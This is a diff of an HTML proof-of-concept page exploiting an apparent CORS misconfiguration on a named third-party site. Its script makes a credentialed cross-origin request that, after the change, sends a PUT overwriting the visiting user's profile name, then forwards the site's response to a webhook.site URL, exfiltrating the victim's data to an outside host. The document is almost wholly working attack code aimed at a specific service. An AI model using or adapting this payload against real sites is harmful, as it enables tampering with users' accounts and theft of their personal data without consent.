@@ -3,18 +3,26 @@
   <body>
     <script>
      fetch("https://plato.varsitylive.in/users/profile", {
-  credentials: "include"
+  method: "PUT",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    name: "AttackedByPoC",
+    // add other fields if required
+  })
 })
 .then(res => res.text())
 .then(data => {
   fetch("https://webhook.site/c646a8e6-efc4-42c2-a049-0f7767dd413c", {
     method: "POST",
-    body: data,
-    mode: "no-cors"
+    mode: "no-cors",
+    body: data
   });
 });
+
     </script>
     <h3>CORS PoC Executed. Check Webhook.</h3>
   </body>
 </html>
-
